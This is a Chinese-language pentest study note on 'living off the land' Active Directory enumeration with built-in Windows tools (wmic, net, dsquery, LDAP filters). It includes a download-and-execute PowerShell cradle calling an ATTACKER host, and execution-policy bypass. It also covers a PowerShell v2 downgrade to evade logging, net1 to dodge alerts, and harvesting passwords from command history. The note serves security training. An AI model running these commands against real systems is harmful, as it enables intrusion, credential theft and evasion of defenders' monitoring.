## 學習目標

- 理解「就地取材」策略的適用情境與隱匿優勢。
- 用 Windows 內建指令（hostname / systeminfo / ipconfig / arp）做主機偵察。
- 用 PowerShell 降級（v2）規避腳本區塊日誌記錄。
- 用 WMI（wmic）查詢網域資訊。
- 用 net / net1 指令列舉使用者、群組與密碼原則。
- 用 dsquery 搭配 LDAP 過濾器精準查詢 AD 物件。
- 理解 UAC 位元值、OID 匹配規則與邏輯運算子的 LDAP 語法。

---

## 理論基礎

```text
就地取材（Living Off the Land, LotL）= 只用目標系統原生工具執行操作
適用情境：
  → 客戶要求測試受管理主機（無法存取網際網路、無法上傳工具）
  → 評估環境有 IDS/IPS / EDR / 網路基準線異常偵測
  → 需要最低痕跡的隱匿測試

優勢：
  → 使用系統管理員日常操作的工具 → 融入正常流量
  → 不需上傳可疑執行檔 → 觸發 AV/EDR 機率低
  → Windows 內建工具幾乎永遠存在

劣勢：
  → net.exe / wmic.exe 等工具仍受 EDR 監控
  → 某些組織對特定 OU 使用者執行特定指令有警報規則
  → 功能不如 PowerView / CME 全面
```

## 一、主機基本偵察

```cmd
:: 主機名稱
hostname
:: → 確認機器名稱，判斷角色（ACADEMY-EA-MS01 → 工作站 / SQL01 → SQL 伺服器）

:: 作業系統版本（PowerShell）
[System.Environment]::OSVersion.Version
:: → 確認 OS 版本與修訂等級，判斷可用漏洞

:: 已安裝修補程式列表
wmic qfe get Caption,Description,HotFixID,InstalledOn
:: Caption     → KB 文章連結
:: HotFixID    → 修補程式編號
:: InstalledOn → 安裝日期（用來判斷修補頻率）

:: 網路介面完整資訊
ipconfig /all
:: → 取得所有網路介面的 IP / 子網路 / 閘道 / DNS Server

:: 環境變數（CMD）
set
:: → 顯示 USERDOMAIN / LOGONSERVER / PATH 等環境變數

:: 網域名稱（CMD）
echo %USERDOMAIN%

:: 登入的 DC 名稱（CMD）
echo %logonserver%

:: 一次性完整摘要（最少日誌產生）
systeminfo
:: → 含 OS / 修補程式 / 網路 / 網域 / 硬體資訊
:: → 單一指令 = 比多個指令產生更少日誌條目
```

## 二、PowerShell 常用偵察 Cmdlet

```powershell
# 列出已載入模組
Get-Module
# → 確認 ActiveDirectory 模組是否可用
# → 也能偵測是否有 Git / 管理腳本等工具

# 查詢執行原則
Get-ExecutionPolicy -List
# → 確認 PowerShell 執行原則（RemoteSigned / Restricted）

# 繞過執行原則（只影響目前 Process，不留永久痕跡）
Set-ExecutionPolicy Bypass -Scope Process
# -Scope Process → 只在此 PS 工作階段有效，離開後自動還原

# 列出環境變數（PowerShell）
Get-ChildItem Env: | ft Key,Value
# → 含 COMPUTERNAME / USERDOMAIN / USERNAME / Path / APPDATA

# 讀取 PowerShell 指令歷史紀錄
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# → 可能含硬編碼密碼或指向含密碼的腳本/設定檔路徑

# 從記憶體下載並執行（無落地檔）
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"
# -nop → No Profile（不載入使用者設定檔）
# iex  → Invoke-Expression（執行下載的字串）
# 注意：此方式仍會被現代 AMSI / EDR 攔截
```

## 三、PowerShell 降級（規避日誌記錄）

### 理論

```text
PowerShell 腳本區塊日誌（Script Block Logging）從 PS 3.0 才引入。
降級到 PS 2.0 → 腳本區塊日誌功能失效 → 後續指令不被記錄。
注意：降級動作本身仍會被記錄（啟動新的 HostVersion 2.0 工作階段）。
防禦者看到 HostVersion=2.0 的新工作階段後，後續日誌空白 → 可能觸發調查。
```

```powershell
# 確認目前 PS 版本
Get-Host
# Version : 5.1.19041.1320

# 降級到 PowerShell 2.0
powershell.exe -version 2
# 啟動後確認版本
Get-Host
# Version : 2.0  ← 確認成功

# 驗證：降級後執行的指令不會出現在 PS Operational Log
# 日誌路徑：
# 應用程式及服務記錄 → Microsoft → Windows → PowerShell → Operational
# 應用程式及服務記錄 → Windows PowerShell
```

## 四、防禦措施檢查

```cmd
:: 防火牆狀態（三個設定檔：Domain / Private / Public）
netsh advfirewall show allprofiles
:: State: OFF → 防火牆已關閉 → 橫向移動阻礙減少
:: State: ON  → 注意 Inbound 規則

:: Windows Defender 服務狀態（CMD）
sc query windefend
:: STATE: 4 RUNNING → Defender 正在執行
```

```powershell
# Windows Defender 詳細設定（PowerShell）
Get-MpComputerStatus
# 關鍵欄位：
# AMServiceEnabled      : True  → Defender 服務啟用
# AntivirusEnabled      : True  → 防毒功能啟用
# BehaviorMonitorEnabled: True  → 行為監控啟用（最難規避）
# IsTamperProtected     : True  → 防竄改保護（無法停用 Defender）
# DefenderSignaturesOutOfDate: False → 病毒庫是最新的
# RealTimeProtectionEnabled   → 即時保護狀態
```

## 五、確認其他登入使用者

```cmd
:: 查看目前所有工作階段
qwinsta
:: SESSIONNAME / USERNAME / STATE
:: console forend 1 Active → forend 正在使用主控台
:: 多個 Active 工作階段 → 其他使用者在線，行動需更謹慎
```

## 六、網路偵察

```cmd
:: ARP 表（找出已知主機）
arp -a
:: → 列出所有已快取的 IP / MAC 對應
:: → 可識別同網段的活躍主機（不需掃描）

:: 路由表（識別可達網段）
route print
:: → Network Destination / Netmask / Gateway / Interface
:: → 有多個 0.0.0.0 閘道 → 主機有多個網路介面
:: → 172.16.4.0/23 路由 → 可能連到其他內部網段（樞紐點）

:: 完整網路介面資訊
ipconfig /all
:: DNS 伺服器通常就是 DC IP
```

## 七：WMI 查詢

### 理論

```text
WMI（Windows Management Instrumentation）= Windows 原生管理框架
在企業環境廣泛使用 → 使用 wmic 查詢融入正常管理流量
可查詢本機或遠端主機（需憑證）
```

```cmd
:: 修補程式資訊
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: 主機基本資訊
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

:: 所有執行中的處理程序
wmic process list /format:list
:: → 找是否有異常處理程序或管理工具

:: 網域與 DC 資訊（最有用）
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
:: → 列出所有網域 / 子網域 / 跨森林信任的 DC 及其 IP
:: → DomainControllerAddress 直接給出 DC IP

:: 所有帳戶（含曾登入的網域帳號）
wmic useraccount list /format:list

:: 本機群組
wmic group list /format:list

:: 服務帳號
wmic sysaccount list /format:list
```

## 八：Net 指令

### 理論

```text
net.exe 是 Windows 內建的網路管理工具。
注意：net.exe 受 EDR 監控，部分組織有警報規則。
技巧：用 net1 替代 net → 功能相同但可能繞過基於字串 "net" 的警報。
```

```cmd
:: 密碼原則（本機）
net accounts

:: 密碼與鎖定原則（網域）
net accounts /domain

:: 所有網域群組
net group /domain

:: 網域管理員列表
net group "Domain Admins" /domain

:: 已加域的電腦列表
net group "domain computers" /domain

:: 網域控制器電腦帳號
net group "Domain Controllers" /domain

:: 特定群組的成員
net group "Contractors" /domain

:: 特定網域使用者詳情（含群組成員資格）
net user wrouse /domain

:: 所有網域使用者
net user /domain

:: 本機管理員群組成員
net localgroup administrators /domain

:: 目前開放的共用
net share

:: 掛載遠端共用
net use x: \\TARGET\sharename

:: 查看網域所有電腦
net view /domain

:: 查看特定主機的所有共用
net view \\TARGET /ALL
```

## 九：Dsquery（AD 物件搜尋）

### 理論

```text
dsquery = AD Domain Services 的命令列搜尋工具
存在於安裝了 AD DS Role 的主機（DC）
dsquery DLL（C:\Windows\System32\dsquery.dll）在所有現代 Windows 系統上都存在
需要提升權限或 SYSTEM 上下文才能執行完整查詢
優勢：原生工具，融入 AD 管理操作
```

```powershell
# 列出所有使用者（DN 格式）
dsquery user
# 輸出：CN=USERNAME,OU=...,DC=DOMAIN,DC=LOCAL

# 列出所有電腦
dsquery computer
# 輸出顯示電腦所在 OU → 判斷角色（DC / Web Server / SQL）

# 萬用字元搜尋指定 OU 的所有物件
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
# * → 所有物件類型
# "CN=Users,..." → 指定搜尋起點

# 搜尋設定 PASSWD_NOTREQD 的帳號（不需密碼）
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" `
  -attr distinguishedName userAccountControl
# (&...) → AND 邏輯（兩個條件都要符合）
# objectCategory=person → 人員物件
# objectClass=user      → 使用者類型
# userAccountControl:1.2.840.113556.1.4.803:=32
#   → 1.2.840.113556.1.4.803 = 位元完全匹配規則（LDAP_MATCHING_RULE_BIT_AND）
#   → 32 = PASSWD_NOTREQD 位元值
# -attr → 只顯示這些屬性

# 搜尋所有 DC（userAccountControl 位元 8192 = SERVER_TRUST_ACCOUNT）
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" `
  -limit 5 -attr sAMAccountName
# -limit 5 → 只顯示前 5 筆
```

## LDAP 過濾語法說明

### UAC 常用位元值

```text
常用 userAccountControl 位元值：
  2        → ACCOUNTDISABLE（帳戶停用）
  32       → PASSWD_NOTREQD（不需密碼）
  64       → PASSWD_CANT_CHANGE（密碼無法變更）
  512      → NORMAL_ACCOUNT（一般帳號）
  65536    → DONT_EXPIRE_PASSWORD（密碼永不過期）
  4194304  → DONT_REQ_PREAUTH（不需 Kerberos 預認證 = ASREPRoastable）
  8192     → SERVER_TRUST_ACCOUNT（網域控制器）
```

### OID 匹配規則

```text
1.2.840.113556.1.4.803（LDAP_MATCHING_RULE_BIT_AND）
  → 位元值必須完全匹配 → 用於匹配單一屬性

1.2.840.113556.1.4.804（LDAP_MATCHING_RULE_BIT_OR）
  → 鏈中任一位元匹配即可 → 用於多屬性組合匹配

1.2.840.113556.1.4.1941（LDAP_MATCHING_RULE_IN_CHAIN）
  → 匹配 DN 的所有所有權和成員資格（遞迴）
  → 用於巢狀群組成員搜尋
```

### 邏輯運算子

```text
&  → AND（所有條件都需符合）
   (&(條件1)(條件2))

|  → OR（任一條件符合即可）
   (|(條件1)(條件2))

!  → NOT（排除符合條件的結果）
   (!條件1)

組合範例：
  (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
  → 使用者物件 AND 密碼無法變更

  (&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
  → 使用者物件 AND 未設定「密碼無法變更」

  (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
  → ASREPRoastable 使用者（不需 Kerberos 預認證）
```

## 判斷邏輯

```
就地取材列舉流程
├── 先確認環境限制
│   ├── PowerShell 可用？→ Get-ExecutionPolicy / Get-Module
│   ├── Defender 狀態？→ Get-MpComputerStatus / sc query windefend
│   └── 防火牆狀態？→ netsh advfirewall show allprofiles
├── 主機偵察（單一指令優先）
│   └── systeminfo → 涵蓋 OS / 修補程式 / 網域 / 網路
├── 確認是否獨自在線
│   └── qwinsta → 避免驚動其他使用者
├── 網路偵察（找橫向移動目標）
│   ├── arp -a    → 已知主機 IP
│   └── route print → 可達網段
├── WMI 列舉
│   └── wmic ntdomain → DC IP + 子域 + 跨林信任
├── net 指令
│   ├── net accounts /domain → 密碼原則（噴灑前必讀）
│   ├── net group "Domain Admins" /domain → 高權帳號
│   └── 用 net1 替代 net 繞過基本字串警報
├── dsquery LDAP 精準搜尋
│   ├── PASSWD_NOTREQD 帳號 → 不需密碼的帳號
│   ├── DONT_REQ_PREAUTH   → ASREPRoastable
│   └── SERVER_TRUST_ACCOUNT → DC 清單
└── PS 降級（若需規避腳本區塊日誌）
    └── powershell.exe -version 2
        → 後續指令不被腳本區塊日誌記錄
        → 注意：降級動作本身仍被記錄
```
